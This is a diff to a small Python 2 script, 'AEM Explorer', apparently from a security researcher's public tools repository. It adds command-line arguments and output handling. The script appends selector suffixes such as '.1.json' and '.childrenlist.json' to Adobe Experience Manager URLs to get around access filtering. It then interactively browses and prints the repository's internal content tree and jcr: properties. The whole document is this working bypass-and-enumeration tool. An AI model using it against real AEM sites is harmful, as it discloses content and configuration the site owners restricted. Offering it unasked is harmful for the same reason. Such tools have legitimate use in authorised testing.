@@ -5,8 +5,12 @@ import requests
 import json
 import sys
 
-host = sys.argv[0]
-bypass = sys.argv[1] # .childrenlist.json,  .1.json etc.
+print "\n### AEM Explorer ###\n hackerone.com/bl4de :: github.com/bl4de/security-tools :: twitter.com/_bl4de"
+print "\n\n usage: ./aem-explorer.py HOST PROTOCOL PAYLOAD \n./aem-explorer.py example.com https .1.json\n\n"
+
+host = sys.argv[1] # example.com
+protocol = sys.argv[2] # https or http
+bypass = sys.argv[3] # .childrenlist.json,  .1.json etc.
 
 headers = {
     'Host': host,
@@ -16,7 +20,7 @@ headers = {
 
 
 def process():
-    url = "{}{}{}".format('http://', host, bypass)
+    url = "{}{}{}".format(protocol + '://', host + '/', bypass)
     resp = requests.get(
         url,
         headers=headers
@@ -27,7 +31,7 @@ def process():
 
     while True:
         goto_path = raw_input("\n\n>>> ")
-        url = "{}{}/{}{}".format('https://', host, goto_path, bypass)
+        url = "{}{}/{}{}".format('https://', host, goto_path + '/', bypass)
         print "DIR: {}\n".format(goto_path)
 
         print url
@@ -37,11 +41,13 @@ def process():
         )
 
         if resp.content:
+            print resp.content
             dirtree = json.loads(resp.content)
-            for d in dirtree:
-                if "jcr:" in d:
-                    print "{}: {}".format(d, dirtree[d])
-                print " {}".format(d)
+            if dirtree:
+                for d in dirtree:
+                    if "jcr:" in d:
+                        print "{}: {}".format(d, dirtree[d])
+                    print " {}".format(d)
 
 
 def main():
